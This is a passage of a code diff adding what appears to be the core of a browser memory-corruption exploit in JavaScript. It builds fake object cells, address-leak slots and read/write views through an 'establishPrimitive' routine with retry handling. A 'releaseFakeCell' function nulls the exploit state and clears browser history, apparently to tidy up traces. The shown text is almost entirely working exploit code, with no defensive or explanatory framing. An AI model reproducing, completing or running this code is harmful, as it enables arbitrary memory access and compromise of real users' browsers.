+    leakSlotAddress: targetAddress + LEAK_SLOT_OFFSET,
+    setLeakSlot(value) {
+      targetHolder.q2 = value;
+    },
+    clearLeakSlot() {
+      targetHolder.q2 = markerObjectA;
+    },
+
+    anchorObject: markerObjectA,
+    anchorObjectAddress: markerAAddress,
+    textarea: anchorElement,
+    textareaAddress: anchorElementAddress,
+
+    profile,
+    attempts: attemptNumber,
+    validate: plausibleAddress,
+
+    hostAddress,
+    fakeAddress,
+
+    assertHome() {
+      if (
+        liveCandidate === null ||
+        rwView === null ||
+        targetView === null ||
+        rwMirror === null
+      )
+        return false;
+      return (
+        rwView[0] === 0x3c && rwMirror[0] === 0x3c && targetView[0] === 0xa5
+      );
+    },
+  };
+}
+
+export function establishPrimitive(options) {
+  const opts = options || {};
+
+  if (fakeReleased)
+    return Promise.reject(
+      new Error(
+        "core: the fake cell has been released to the real-cell pair -- " +
+          "establishPrimitive cannot run again in this page",
+      ),
+    );
+  if (running) return Promise.reject(new Error("core: already running"));
+  if (
+    typeof BigInt !== "function" ||
+    typeof MessageChannel !== "function" ||
+    typeof Symbol !== "function" ||
+    typeof history === "undefined" ||
+    typeof history.replaceState !== "function"
+  )
+    return Promise.reject(new Error("core: unsupported browser"));
+
+  onEvent = typeof opts.onEvent === "function" ? opts.onEvent : null;
+  criticalBarrier =
+    typeof opts.beforeCriticalLoad === "function"
+      ? opts.beforeCriticalLoad
+      : defaultCriticalBarrier;
+
+  if (criticalBarrier === defaultCriticalBarrier) ensureBarrierNode();
+  attemptCeiling =
+    typeof opts.maxAttempts === "number" && opts.maxAttempts > 0
+      ? opts.maxAttempts
+      : 0;
+
+  running = true;
+  stopped = false;
+  attemptNumber = 1;
+  try {
+    sessionStorage.removeItem(attemptKey);
+  } catch {}
+
+  return new Promise((resolve, reject) => {
+    settleResolve = resolve;
+    settleReject = reject;
+    startAttempt();
+  });
+}
+
+export function currentCarrier() {
+  return liveCandidate === null ? null : buildCarrier();
+}
+
+const RELEASED_BINDINGS = [
+  "liveCandidate",
+  "fakeHost",
+  "lengthWord",
+  "getterCarrier",
+  "leakedScope",
+  "preparedSymbolObject",
+  "capturedString",
+  "capturedWords",
+  "predecessorWords",
+  "outerGraph",
+  "fillerGraph",
+  "referenceTarget",
+  "keepAlive",
+];
+
+export function releaseFakeCell() {
+  const report = {
+    released: RELEASED_BINDINGS.slice(),
+    alreadyReleased: fakeReleased,
+    hostAddress,
+    fakeAddress,
+    historyCleared: false,
+  };
+  if (fakeReleased) return report;
+
+  liveCandidate = null;
+  fakeHost = null;
+  lengthWord = null;
+
+  getterCarrier = null;
+  leakedScope = null;
+  preparedSymbolObject = null;
+
+  capturedString = null;
+  capturedWords = null;
+
+  predecessorWords = null;
+  outerGraph = null;
+  fillerGraph = null;
+  referenceTarget = null;
+  keepAlive = null;
+
+  try {
+    history.replaceState(null, "");
+    report.historyCleared = history.state === null;
+  } catch (_) {}
+
+  fakeReleased = true;
+  stopped = true;
+  running = false;
+
+  retryScheduled = false;
+  return report;
+}
+
+export function fakeCellReleased() {
+  return fakeReleased;
+}
+
+export function carrierHeaderCopy() {
+  return rwHeader.slice(0, CELL_BYTES);
+}
+
+export function carrierHomeVector() {
+  return rwOriginalVector;
+}
+
+export { profile, aimCarrier, restoreCarrier, plausibleAddress, plausibleCell };
